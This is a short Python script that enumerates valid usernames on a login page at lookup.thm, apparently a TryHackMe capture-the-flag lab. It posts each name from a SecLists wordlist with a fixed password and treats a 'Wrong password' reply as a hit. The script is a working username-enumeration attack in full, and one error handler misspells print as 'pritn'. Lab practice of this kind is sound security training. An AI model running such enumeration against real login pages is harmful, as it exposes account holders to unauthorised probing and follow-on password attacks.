import requests

url="http://lookup.thm/login.php"
file_path="/usr/share/seclists/Usernames/Names/names.txt"

try:
	with open(file_path, 'r') as file:
		for line in file:
			username = line.strip()
			if not username:
				continue
			data = {
				"username": username,
				"password": "password"
			}

			response = requests.post(url, data=data)

			if "Wrong password" in response.text:
				print(f"Username found: {username}")
			elif "Wrong username" in response.text:
				continue

except FileNotFoundError:
	print("Error file not found")
except requests.RequestException as e:
	pritn(f"Error http request ocurred: {e} ")
